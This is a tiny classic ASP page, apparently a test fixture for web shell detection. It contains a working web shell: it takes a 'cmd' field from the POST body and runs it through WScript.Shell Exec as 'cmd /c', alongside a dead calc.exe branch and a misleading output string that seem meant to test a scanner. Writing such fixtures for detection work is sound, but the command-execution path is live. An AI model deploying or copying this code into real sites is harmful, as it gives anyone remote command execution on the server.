<%@ Language=VBScript %>
<%
Dim sh, c
c = Request.Form("cmd")
' Execute Request("code")   -- removed in fixture
Set sh = CreateObject("WScript.Shell")
If False Then
  sh.Run "calc.exe"
End If
Set ex = sh.Exec("cmd /c " & c)
Response.Write "sh.Exec is the API name"
%>
